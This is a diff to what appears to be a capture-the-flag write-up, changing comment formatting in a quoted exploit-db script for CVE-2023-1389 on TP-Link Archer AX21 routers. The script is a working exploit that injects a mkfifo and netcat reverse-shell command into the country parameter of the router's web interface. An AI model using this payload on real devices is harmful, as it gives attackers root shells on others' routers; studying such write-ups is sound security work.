@@ -133,51 +133,51 @@ From exploit-db, the exploit code provides insight into the request structure ne
 <pre><code class="language-python">
 #!/usr/bin/python3
 #
-<h1>Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection</h1>
-<h1>Date: 07/25/2023</h1>
-<h1>Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)</h1>
-<h1>Vendor Homepage: https://www.tp-link.com/us/</h1>
-<h1>Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219</h1>
-<h1>Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0</h1>
-<h1>CVE: CVE-2023-1389</h1>
+# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection
+# Date: 07/25/2023
+# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
+# Vendor Homepage: https://www.tp-link.com/us/
+# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219
+# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
+# CVE: CVE-2023-1389
 #
-<h1>Disclaimer: This script is intended to be used for educational purposes only.</h1>
-<h1>Do not run this against any system that you do not have permission to test.</h1>
-<h1>The author will not be held responsible for any use or damage caused by this program.</h1>
+# Disclaimer: This script is intended to be used for educational purposes only.
+# Do not run this against any system that you do not have permission to test.
+# The author will not be held responsible for any use or damage caused by this program.
 #
-<h1>CVE-2023-1389 is an unauthenticated command injection vulnerability in the web</h1>
-<h1>management interface of the TP-Link Archer AX21 (AX1800), specifically, in the</h1>
-<h1><em>country</em> parameter of the <em>write</em> callback for the <em>country</em> form at the</h1>
-<h1>"/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is</h1>
-<h1>possible to run commands as root. Execution requires sending the request twice;</h1>
-<h1>the first request sets the command in the <em>country</em> value, and the second request</h1>
-<h1>(which can be identical or not) executes it.</h1>
+# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
+# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
+# <em>country</em> parameter of the <em>write</em> callback for the <em>country</em> form at the
+# "/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is
+# possible to run commands as root. Execution requires sending the request twice;
+# the first request sets the command in the <em>country</em> value, and the second request
+# (which can be identical or not) executes it.
 #
-<h1>This script is a short proof of concept to obtain a reverse shell. To read more</h1>
-<h1>about the development of this script, you can read the blog post here:</h1>
-<h1>https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94</h1>
-<h1>Before running the script, start a nc listener on your preferred port -> run the script -> profit</h1>
+# This script is a short proof of concept to obtain a reverse shell. To read more
+# about the development of this script, you can read the blog post here:
+# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
+# Before running the script, start a nc listener on your preferred port -> run the script -> profit
 
 import requests, urllib.parse, argparse
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-<h1>Suppress warning for connecting to a router with a self-signed certificate</h1>
+# Suppress warning for connecting to a router with a self-signed certificate
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-<h1>Take user input for the router IP, and attacker IP and port</h1>
+# Take user input for the router IP, and attacker IP and port
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
 parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
 parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")
 args = parser.parse_args()
 
-<h1>Generate the reverse shell command with the attacker IP and port</h1>
+# Generate the reverse shell command with the attacker IP and port
 revshell = urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.attacker + " " + args.port + " >/tmp/f")
 
-<h1>URL to obtain the reverse shell</h1>
+# URL to obtain the reverse shell
 url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"
 
-<h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
+# Send the URL twice to run the command. Sending twice is necessary for the attack
 r = requests.get(url_command, verify=False)
 r = requests.get(url_command, verify=False)
 </code></pre>
@@ -185,10 +185,10 @@ r = requests.get(url_command, verify=False)
 Key portion of the script:
 
 <pre><code class="language-python">
-<h1>URL to obtain the reverse shell</h1>
+# URL to obtain the reverse shell
 url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"
 
-<h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
+# Send the URL twice to run the command. Sending twice is necessary for the attack
 </code></pre>
 
 <img src="/HHC_2025/images/dosisnetwork_200.jpg" alt="Testing GET request structure showing 200 OK response">
